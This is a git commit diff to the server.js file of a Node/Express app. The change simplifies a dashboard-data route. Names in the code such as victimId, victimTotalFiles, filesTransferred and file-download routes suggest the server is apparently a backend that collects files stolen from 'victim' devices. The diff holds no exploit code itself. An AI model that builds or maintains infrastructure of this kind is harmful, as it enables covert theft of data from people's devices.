b2a777f1d7106c6857f9eec548d4ddda655f4d90
Naseer NOOR <naseer.ord@gmail.com>
2025-03-08 08:00:55 +0900

    Updated code-v6

--- server.js
+++ server.js
@@ -157,18 +157,7 @@ app.post('/upload', (req, res) => {
 
 // Route to provide dashboard data
 app.get('/dashboard-data', (req, res) => {
-  // Prepare the dashboard data with total files info
-  const dashboardData = Object.keys(connectedDevices).map(victimId => {
-    return {
-      victimId: victimId,
-      totalFiles: victimTotalFiles[victimId] || 'NA', // Ensure total files are shown
-      filesTransferred: connectedDevices[victimId].filesTransferred,
-      lastConnectionTime: connectedDevices[victimId].lastConnectionTime,
-      fileList: connectedDevices[victimId].fileList,
-    };
-  });
-
-  res.json(dashboardData);
+  res.json(connectedDevices);
 });
 
 // Route to download files
